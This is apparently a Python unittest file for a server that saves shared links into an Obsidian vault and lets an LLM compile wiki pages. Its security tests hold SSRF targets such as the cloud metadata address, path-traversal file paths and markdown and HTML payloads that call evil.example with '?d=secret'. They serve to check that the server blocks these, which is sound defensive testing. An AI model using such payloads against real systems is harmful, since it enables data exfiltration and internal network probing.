import json
import tempfile
import threading
import unittest
import urllib.error
import urllib.request
from http.server import ThreadingHTTPServer
from pathlib import Path

import stash_server as s

TOKEN = "test-token"


class PureFunctions(unittest.TestCase):
    def test_detect_source(self):
        self.assertEqual(s.detect_source("https://www.instagram.com/reel/ABC123/?igsh=x"), "instagram-reel")
        self.assertEqual(s.detect_source("https://youtu.be/xyz"), "youtube")
        self.assertEqual(s.detect_source("https://example.com/a"), "web")
        self.assertEqual(s.detect_source(""), "text")

    def test_url_pulled_out_of_text(self):
        cap, err = s.normalize_capture({"text": "이거 봐 https://www.instagram.com/reel/ABC/ 대박"})
        self.assertIsNone(err)
        self.assertEqual(cap["url"], "https://www.instagram.com/reel/ABC/")
        self.assertEqual(cap["source"], "instagram-reel")

    def test_rejects_empty_and_non_http(self):
        self.assertIsNotNone(s.normalize_capture({})[1])
        self.assertIsNotNone(s.normalize_capture({"url": "file:///etc/passwd"})[1])
        self.assertIsNotNone(s.normalize_capture([1])[1])

    def test_slugify_keeps_korean(self):
        self.assertEqual(s.slugify("LLM 위키 만들기!"), "llm-위키-만들기")


class HttpApi(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.vault = Path(self.tmp.name)
        s.ensure_vault(self.vault)
        self.server = ThreadingHTTPServer(("127.0.0.1", 0), s.make_handler(self.vault, TOKEN, None))
        threading.Thread(target=self.server.serve_forever, daemon=True).start()
        self.base = f"http://127.0.0.1:{self.server.server_port}"

    def tearDown(self):
        self.server.shutdown()
        self.server.server_close()
        self.tmp.cleanup()

    def call(self, method, path, body=None, token=TOKEN):
        data = json.dumps(body).encode() if body is not None else None
        req = urllib.request.Request(self.base + path, data=data, method=method,
                                     headers={"Authorization": f"Bearer {token}",
                                              "Content-Type": "application/json"})
        try:
            with urllib.request.urlopen(req) as r:
                return r.status, json.loads(r.read())
        except urllib.error.HTTPError as e:
            return e.code, json.loads(e.read())

    def test_vault_layout(self):
        for rel in ("CLAUDE.md", "AGENTS.md", "Home.md", "Inbox.base", "wiki/index.md", ".obsidian/app.json"):
            self.assertTrue((self.vault / rel).exists(), rel)
        self.assertTrue((self.vault / "raw").is_dir())
        self.assertFalse((self.vault / "raw" / ".gitkeep").exists())

    def test_ensure_vault_keeps_user_edits(self):
        (self.vault / "Home.md").write_text("내가 고친 홈", encoding="utf-8")
        s.ensure_vault(self.vault)
        self.assertEqual((self.vault / "Home.md").read_text(encoding="utf-8"), "내가 고친 홈")

    def test_health_requires_token(self):
        self.assertEqual(self.call("GET", "/health")[0], 200)
        self.assertEqual(self.call("GET", "/health", token="wrong")[0], 401)

    def test_capture_writes_raw_note(self):
        code, body = self.call("POST", "/capture", {
            "url": "https://www.instagram.com/reel/ABC123/",
            "text": "꼭 볼 릴스", "source_app": "com.burbn.instagram"})
        self.assertEqual(code, 201)
        note = (self.vault / body["path"]).read_text(encoding="utf-8")
        self.assertTrue(body["path"].startswith("raw/"))
        self.assertIn("source: instagram-reel", note)
        self.assertIn('url: "https://www.instagram.com/reel/ABC123/"', note)
        self.assertIn("꼭 볼 릴스", note)

    def test_same_second_captures_do_not_overwrite(self):
        p1 = self.call("POST", "/capture", {"url": "https://example.com/x"})[1]["path"]
        p2 = self.call("POST", "/capture", {"url": "https://example.com/x"})[1]["path"]
        self.assertNotEqual(p1, p2)

    def test_capture_rejects_bad_token_and_bad_body(self):
        self.assertEqual(self.call("POST", "/capture", {"url": "https://a.com"}, token="nope")[0], 401)
        self.assertEqual(self.call("POST", "/capture", {"title": "no url"})[0], 400)
        self.assertEqual(list((self.vault / "raw").glob("*.md")), [])


class WorkerEnrich(unittest.TestCase):
    def test_worker_marks_enriched_with_meta(self):
        with tempfile.TemporaryDirectory() as tmp:
            vault = Path(tmp)
            s.ensure_vault(vault)
            cap, _ = s.normalize_capture({"url": "https://example.com/post"})
            path = s.write_capture(vault, cap)
            original = s.fetch_meta
            s.fetch_meta = lambda url: {"title": "Fetched title", "description": "요약 설명"}
            try:
                w = s.Worker(vault)
                w.submit(path, cap)
                w.jobs.join()
            finally:
                s.fetch_meta = original
            note = path.read_text(encoding="utf-8")
            self.assertIn("status: enriched", note)
            self.assertIn("# Fetched title", note)
            self.assertIn("요약 설명", note)

    def test_compile_writes_only_wiki_markdown(self):
        """The model only replies with JSON; the server refuses anything outside wiki/*.md."""
        with tempfile.TemporaryDirectory() as tmp:
            vault = Path(tmp)
            s.ensure_vault(vault)
            cap, _ = s.normalize_capture({"url": "https://example.com/post"})
            path = s.write_capture(vault, cap)
            reply = {"files": [
                {"path": "wiki/Page.md", "content": "PROMPT_FROM_STDIN"},
                {"path": ".obsidian/plugins/x/main.js", "content": "evil"},
                {"path": "raw/evil.md", "content": "evil"},
                {"path": "wiki/../escape.md", "content": "evil"},
                {"path": "wiki/.hidden.md", "content": "evil"},
                {"path": "wiki/script.js", "content": "evil"},
            ]}
            # Fake LLM: echoes its stdin prompt into the allowed page so we also check stdin delivery.
            fake_llm = ["python3", "-c",
                        "import json,sys; r=json.loads(sys.argv[1]); r['files'][0]['content']=sys.stdin.read();"
                        "print('Here you go:'); print(json.dumps(r))", json.dumps(reply)]
            w = s.Worker(vault, enrich=False, compile_cmd=fake_llm)
            w.submit(path, cap)
            w.jobs.join()
            prompt = (vault / "wiki" / "Page.md").read_text(encoding="utf-8")
            self.assertIn(path.relative_to(vault).as_posix(), prompt)
            self.assertIn("https://example.com/post", prompt)  # source content is pasted in: no file tools needed
            self.assertIn("LLM wiki", prompt)  # and so is the vault's CLAUDE.md schema
            for bad in (".obsidian/plugins/x/main.js", "raw/evil.md", "escape.md", "wiki/.hidden.md", "wiki/script.js"):
                self.assertFalse((vault / bad).exists(), bad)
            self.assertIn("status: compiled", path.read_text(encoding="utf-8"))


class EnrichSafety(unittest.TestCase):
    def test_private_and_local_urls_are_not_fetched(self):
        for url in ("http://127.0.0.1:8765/health", "http://localhost/", "http://192.168.0.1/admin",
                    "http://169.254.169.254/latest/meta-data/", "http://[::1]/", "file:///etc/passwd"):
            self.assertFalse(s.is_public_url(url), url)
            self.assertEqual(s.fetch_meta(url), {}, url)

    def test_connection_to_private_peer_is_refused(self):
        """Even if DNS said "public" earlier (rebinding) or a redirect points inward, the socket check stops it."""
        server = ThreadingHTTPServer(("127.0.0.1", 0), s.make_handler(Path("."), TOKEN, None))
        threading.Thread(target=server.serve_forever, daemon=True).start()
        try:
            with self.assertRaises(OSError):
                s.PUBLIC_ONLY_OPENER.open(f"http://127.0.0.1:{server.server_port}/health", timeout=5)
        finally:
            server.shutdown()
            server.server_close()

    def test_platform_detection_needs_the_real_domain(self):
        self.assertEqual(s.detect_source("https://instagram.com.evil.example/reel/x"), "web")
        self.assertEqual(s.detect_source("https://notx.com/a"), "web")
        self.assertEqual(s.detect_source("https://m.youtube.com/watch?v=1"), "youtube")
        self.assertEqual(s.detect_source("https://www.threads.net/@a/post/1"), "threads")

    def test_https_peer_is_checked_before_tls(self):
        """A plain-HTTP local server can't speak TLS: getting *our* refusal (not an SSL error) proves
        the check ran before the ClientHello was sent."""
        server = ThreadingHTTPServer(("127.0.0.1", 0), s.make_handler(Path("."), TOKEN, None))
        threading.Thread(target=server.serve_forever, daemon=True).start()
        try:
            conn = s.PublicHTTPSConnection("127.0.0.1", server.server_port, timeout=5)
            with self.assertRaisesRegex(OSError, "refused non-public peer"):
                conn.connect()
        finally:
            server.shutdown()
            server.server_close()

    def test_only_http_handlers_and_http_redirects(self):
        handlers = {type(h).__name__ for h in s.PUBLIC_ONLY_OPENER.handlers}
        self.assertFalse(handlers & {"FTPHandler", "FileHandler", "DataHandler", "CacheFTPHandler"})
        req = urllib.request.Request("https://example.com/")
        for target in ("ftp://192.168.0.1/x", "file:///etc/passwd", "data:text/plain,x"):
            self.assertIsNone(s.HttpOnlyRedirects().redirect_request(req, None, 302, "Found", {}, target), target)

    def test_model_output_cannot_auto_load_remote_content(self):
        md = "\n".join([
            "![x](https://evil.example/a?d=secret)",       # inline image
            "![y][ref]",                                    # reference-style image
            "[ref]: https://evil.example/b?d=secret",
            '<img src="https://evil.example/c">',
            '<svg><image href="https://evil.example/d"/></svg>',
            '<link rel="stylesheet" href="https://evil.example/e">',
            "![[https://evil.example/f.png]]",              # URL as an Obsidian embed
            "<<b>img src=https://evil.example/g>",         # rebuilt by a one-pass tag strip
            "!![x](https://evil.example/h)",               # rebuilt by replacing only one "!"
            "![[x](https://evil.example/i)",               # slipped past a "![[" lookahead
            "![x](//evil.example/j.png)",                  # protocol-relative
            "!\x000\x00 ![[Local note]] [ok](https://a.b) <https://a.b>",  # forged placeholder
        ])
        out = s.defang_markdown(md)
        self.assertNotIn("![", out.replace("![[Local note]]", ""))
        self.assertNotRegex(out, r"<(?!https://a\.b>)")  # no raw HTML left, autolink kept
        self.assertEqual(out.count("![[Local note]]"), 1)
        self.assertIn("[ok](https://a.b)", out)

    def test_mermaid_blocks_are_not_rendered(self):
        md = '```mermaid\nA@{ img: "https://evil.example/k" }\n```\n> ~~~ Mermaid\nB\n~~~'
        self.assertNotRegex(s.defang_markdown(md), r"(?i)mermaid")

    def test_symlinked_pages_are_not_read(self):
        with tempfile.TemporaryDirectory() as tmp, tempfile.TemporaryDirectory() as outside:
            vault = Path(tmp)
            s.ensure_vault(vault)
            secret = Path(outside) / "secret.txt"
            secret.write_text("TOP-SECRET", encoding="utf-8")
            (vault / "wiki" / "Leak.md").symlink_to(secret)
            cap, _ = s.normalize_capture({"url": "https://example.com/post"})
            prompt, _ = s.build_compile_prompt(vault, s.write_capture(vault, cap))
            self.assertNotIn("TOP-SECRET", prompt)

    def test_pages_omitted_from_prompt_are_not_overwritten(self):
        with tempfile.TemporaryDirectory() as tmp:
            vault = Path(tmp)
            s.ensure_vault(vault)
            big = vault / "wiki" / "Big.md"
            big.write_text("x" * (s.WIKI_PROMPT_BUDGET + 1), encoding="utf-8")
            cap, _ = s.normalize_capture({"url": "https://example.com/post"})
            prompt, omitted = s.build_compile_prompt(vault, s.write_capture(vault, cap))
            self.assertEqual(omitted, {"wiki/Big.md"})
            reply = json.dumps({"files": [{"path": "wiki/Big.md", "content": "replaced"},
                                          {"path": "wiki/New.md", "content": "new"}]})
            self.assertEqual(s.apply_compile_output(vault, reply, omitted), ["wiki/New.md"])
            self.assertEqual(len(big.read_text(encoding="utf-8")), s.WIKI_PROMPT_BUDGET + 1)


if __name__ == "__main__":
    unittest.main()
